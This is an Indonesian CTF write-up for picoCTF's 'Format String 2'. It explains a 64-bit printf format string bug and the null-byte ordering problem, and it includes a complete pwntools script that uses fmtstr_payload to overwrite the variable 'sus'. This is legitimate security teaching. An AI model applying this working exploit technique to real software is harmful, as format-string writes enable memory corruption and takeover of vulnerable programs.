# Write-Up: picoCTF - Format String 2

## 1. Informasi Tantangan

* **Kategori:** Pwn / Binary Exploitation
* **Arsitektur:** amd64-64-little (64-bit)
* **Target:** Memanfaatkan kerentanan *Format String* untuk menimpa (overwrite) sebuah variabel di dalam memori (`sus`) dengan nilai spesifik agar kondisi *if-statement* terpenuhi dan *flag* tercetak.

## 2. Analisis Kerentanan (Vulnerability Analysis)

Tantangan ini berpusat pada penggunaan fungsi `printf()` yang tidak aman. Program menerima input dari *user* dan mencetaknya langsung tanpa *format specifier* pengaman (misal: `printf("%s", input)`).

Kondisi target yang harus dipenuhi untuk mendapatkan *flag* adalah:
`sus == 0x67616c66`

Nilai heksadesimal `0x67616c66` jika dikonversi ke dalam desimal adalah **1.734.437.990**. Artinya, kita harus memaksa `printf` untuk mencetak karakter sebanyak 1.734.437.990 kali, lalu menggunakan specifier `%n` untuk memasukkan jumlah total karakter tersebut ke dalam alamat memori variabel `sus`.

## 3. Tantangan Khusus: Jebakan Null Byte 64-bit

Pada eksploitasi arsitektur 32-bit, *payload* umumnya disusun dengan menaruh alamat target di awal (contoh: `[Alamat] + [%x] + [%n]`). Namun, pada arsitektur 64-bit, alamat memori (seperti `0x404060`) akan dibaca lengkap sebagai 8-byte (`\x60\x40\x40\x00\x00\x00\x00\x00`).

Karakter `\x00` (Null Byte) merupakan karakter terminasi string dalam bahasa C. Jika alamat diletakkan di depan, `printf` akan berhenti membaca *payload* tepat saat menabrak `\x00`, sehingga perintah `%c` dan `%n` di belakangnya akan diabaikan sepenuhnya.

**Solusi:** Posisi *payload* harus dibalik. Format *padding* dan `%n` harus dieksekusi terlebih dahulu, baru kemudian alamat target diletakkan di posisi paling akhir string (`[%c] + [%n] + [Alamat]`).

## 4. Strategi Eksploitasi

Menyusun *payload* 64-bit secara manual sangat rumit karena memindahkan alamat ke belakang akan mengubah kalkulasi letak *offset* argumen secara drastis. Oleh karena itu, strategi paling efisien adalah menggunakan fitur otomasi dari modul `pwntools`.

1. **Mencari Offset:** Lakukan *fuzzing* manual menggunakan `AAAA.%p.%p.%p...` untuk menemukan di argumen ke-berapa input kita mulai mendarat di *Stack*. (Dalam kasus ini, diasumsikan berada di *offset* 14).
2. **Mendapatkan Alamat Target:** Ekstrak lokasi memori dari variabel `sus` secara otomatis menggunakan tabel simbol ELF dari *binary*.
3. **Merakit Payload:** Gunakan fungsi `fmtstr_payload()` yang secara otomatis akan:
* Meletakkan alamat target di akhir *payload*.
* Memecah penulisan angka raksasa 1,7 Miliar menjadi kepingan-kepingan memori kecil (`%hhn` / per-byte) agar eksekusi program tidak *hang*.
* Mengkalkulasi *offset* baru secara matematis.



## 5. Script Eksploitasi (Python / Pwntools)

Berikut adalah *script* untuk menyelesaikan tantangan secara presisi:

```python
#!/usr/bin/env python3
from pwn import *

# ========================================================
# SETUP ENVIRONMENT
# ========================================================
# Load binary target
exe = ELF('./vuln')
context.binary = exe

# Jalankan proses (ganti dengan remote('host', port) untuk server)
io = process('./vuln')

# ========================================================
# TAHAP 1: PERSIAPAN VARIABEL
# ========================================================
# Offset letak variabel input di stack terhadap printf (hasil fuzzing)
OFFSET = 14 

# Dapatkan alamat variabel 'sus' secara otomatis dari binary
sus_addr = exe.symbols['sus']
log.info(f"Alamat variabel 'sus' ditemukan pada: {hex(sus_addr)}")

# Nilai target yang diminta oleh program (0x67616c66)
TARGET_VALUE = 0x67616c66

# ========================================================
# TAHAP 2: GENERASI PAYLOAD & EKSEKUSI
# ========================================================
# Pwntools otomatis merakit format string 64-bit:
# - Memposisikan alamat sus di akhir
# - Menggunakan %hhn untuk penulisan bertahap
# - Mengisi padding yang tepat untuk mencapai 0x67616c66
log.info("Merakit payload Format String 64-bit...")
payload = fmtstr_payload(OFFSET, {sus_addr: TARGET_VALUE})

# Kirim payload ke program
io.sendline(payload)

# Tangkap output dan dapatkan flag
io.interactive()

```

## 6. Kesimpulan Eksekusi

*Script* memanfaatkan `fmtstr_payload` untuk menangani kompleksitas penulisan memori 64-bit secara efisien. Saat program memproses *payload*, `printf` dipaksa menuliskan susunan *byte* yang jika digabungkan membentuk nilai `0x67616c66` ke dalam alamat variabel `sus`. Setelah `printf` selesai bekerja, instruksi percabangan `if (sus == 0x67616c66)` akan bernilai *True*, dan program akan membuka akses *shell* atau mencetak *flag*.